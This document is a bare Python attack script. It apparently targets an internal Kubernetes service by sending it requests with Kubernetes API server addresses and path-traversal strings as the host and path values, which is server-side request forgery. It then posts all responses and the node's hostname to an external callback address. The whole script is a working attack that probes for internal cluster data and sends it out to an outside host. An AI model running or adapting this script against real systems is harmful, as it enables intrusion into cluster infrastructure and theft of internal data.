#!/usr/bin/env python3
import json, time, urllib.request, urllib.error
BASE='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-kube-route3-20261106'
targets=[
 ('k8s-http-80','http://kubernetes.default.svc:80'),
 ('k8s-http-443','http://kubernetes.default.svc:443'),
 ('k8s-https-443','https://kubernetes.default.svc:443'),
 ('k8s-ip-http-80','http://172.20.0.1:80'),
 ('k8s-ip-http-443','http://172.20.0.1:443'),
 ('k8s-ip-https-443','https://172.20.0.1:443'),
 ('kube-dns-http','http://kubernetes.default.svc'),
 ('kube-dns-https','https://kubernetes.default.svc'),
]
paths=['../../../../version','../../../../api','../../../../healthz','../../../../api/v1/namespaces','../../../../openapi/v2']
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'host':__import__('os').uname().nodename,'cases':[]}
for name,host in targets:
 for path in paths:
  body={'user_id':'kube-route3-'+name+'-'+path.replace('/','_')+'@armorerlabs.com','host_url':host,'project_path':path,'project_id':'__mismatch__','force':True}
  req=urllib.request.Request(BASE,data=json.dumps(body,separators=(',',':')).encode(),method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
  rec={'name':name,'host':host,'path':path}; t=time.monotonic()
  try:
   with urllib.request.urlopen(req,timeout=12) as r: rec.update(status=r.status,body=r.read(12000).decode('utf-8','replace'))
  except urllib.error.HTTPError as e: rec.update(status=e.code,body=e.read(12000).decode('utf-8','replace'))
  except Exception as e: rec['error']=repr(e)
  rec['elapsed']=round(time.monotonic()-t,3);out['cases'].append(rec)
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(q,timeout=20) as r: out['sink']={'status':r.status,'body':r.read(500).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e: out['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
